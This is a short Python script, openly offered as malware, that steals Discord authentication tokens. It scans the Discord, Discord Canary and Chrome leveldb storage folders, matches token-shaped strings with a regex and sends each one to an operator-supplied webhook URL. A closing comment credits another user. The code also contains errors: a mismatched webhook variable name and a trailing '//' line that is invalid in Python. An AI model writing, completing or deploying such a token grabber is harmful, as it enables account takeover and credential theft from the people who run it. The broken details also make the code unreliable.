import os, re, requests

WEBHOOK = "YOUR WEBHOOK URL"
APPDATA = os.environ.get("APPDATA")

dirs = [
f"{APPDATA}\\Discord\\Local Storage\\leveldb", 
f"{APPDATA}\\discordcanary\\Local Storage\\leveldb", 
f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
]

def post(hook:str, message:str):
    _payload = {
        "content": f'```\n{message}```'   
    }
    requests.post(hook, json=_payload)

for location in dirs:
    for file in os.listdir(location):
        with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _data:
            try:
                regex = re.findall(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}", _data.read())
                if regex:
                    for reg in regex:
                        post(webhook, reg);
            except PermissionError:
                continue
input(" Press enter to close" )










// Specwiel tanks to /xanthe1337
